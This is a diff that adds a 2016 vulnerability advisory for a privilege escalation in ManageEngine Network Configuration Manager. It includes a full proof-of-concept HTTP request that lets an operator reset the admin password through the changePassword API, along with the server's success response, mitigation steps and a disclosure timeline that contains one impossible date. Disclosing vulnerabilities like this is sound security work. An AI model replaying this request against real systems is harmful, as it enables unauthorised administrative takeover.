@@ -1,0 +1,128 @@
+===================================================================================
+Privilege escalation Vulnerability in ManageEngine Network Configuration Management
+===================================================================================
+
+Overview
+========
+
+Title:- Privilege escalation Vulnerability in ManageEngine Network Configuration Management
+Author: Kaustubh G. Padwad
+Vendor: ZOHO Corp
+Product: ManageEngine Network Configuration Manager
+Tested Version: : Network Configuration Manager Build 11000
+Severity: HIGH
+
+Advisory ID
+============
+2016-03-Manage_Engine
+
+About the Product:
+==================
+
+Network Configuration Manager is a web–based, multi vendor network change, configuration and compliance management (NCCCM) solution for switches, routers, firewalls and other network devices. Trusted by thousands of network administrators around the world, Network Configuration Manager helps automate and take total control of the entire life cycle of device configuration management.
+
+Description:
+============
+
+This Privilege escalation vulnerability enables an Normal user to escalate privilege and become administrator of the application.
+
+Vulnerability Class:
+====================
+Top 10 2014-I2 Insufficient Authentication/Authorization https://www.owasp.org/index.php/Top_10_2014-I2_Insufficient_Authentication/Authorization
+
+
+How to Reproduce: (POC):
+========================
+
+* you should have Operator Account on Network Configuration Management
+
+* login with that account to get api key something like user_1453993872278
+
+* Setup Burp and use change user password request and change userName to admin and newPwd to desire password HUrry you are admin now. :)
+
+POC
+====
+
+Burp Requst
+-----------
+POST /nfaapi/json/admin/changePassword HTTP/1.1
+
+Host: 192.168.1.10:8080
+
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0 Iceweasel/31.5.0
+
+Accept: */*
+
+Accept-Language: en-US,en;q=0.5
+
+Accept-Encoding: gzip, deflate
+
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+X-Requested-With: XMLHttpRequest
+
+Referer: http://192.168.1.10:8080/netflow/ncmapiclient/ember/index.jsp
+
+Content-Length: 50
+
+Cookie: OPUTILSJSESSIONID=E062B23129AA1269EF13794C7710DF8E; JSESSIONID=FBA6ADEE16123786896DF765CA4C9E87; NFA_Jsession=0BF63F9CE8F4DCF664857F92403D8B44; iamcsrfcookie=fbcc4bcb-34ea-4cc8-8cb3-e95dbfc0603d; NFA__SSO=0ED579E64493B973F5BCA1C94EAD6310
+
+Connection: keep-alive
+
+Pragma: no-cache
+
+Cache-Control: no-cache
+
+
+
+userName=admin&newPwd=11&apiKey=king_1453993872278
+
+
+Response
+--------
+HTTP/1.1 200 OK
+
+Server: Apache-Coyote/1.1
+
+Access-Control-Allow-Origin: *
+
+Access-Control-Allow-Methods: GET,POST
+
+Access-Control-Max-Age: 5000
+
+Content-Type: application/json;charset=UTF-8
+
+Date: Sat, 30 Jan 2016 20:22:15 GMT
+
+Content-Length: 23
+
+
+
+{"message":"success"}
+
+
+
+Mitigation
+==========
+
+* Please Stop Network configuration manager  service.
+* Open Ncm\lib and cut AdvNCM.jar and paste it in to Desktop.
+* Download the AdvNCM.jar file from below link and paste it under Ncm\lib
+* https://uploads.zohocorp.com/Internal_Useruploads/dnd/DeviceExpert/o_1ab396o1i1a6v8j1cr86uet581/AdvNCM.jar
+* Open Ncm\logs and delete all the files inside it,
+* Start the Ncm service and check the issue.
+
+Disclosure:
+===========
+* 31-JAN-2016 Repoerted to vendor
+* 31-Feb-2016 Ack by Vendor
+* 09-Feb-2016 Fixed By Vendor
+
+credits:
+========
+* Kaustubh Padwad
+* Information Security Researcher
+* kingkaustubh@me.com
+* https://twitter.com/s3curityb3ast
+* http://breakthesec.com
+* https://www.linkedin.com/in/kaustubhpadwad
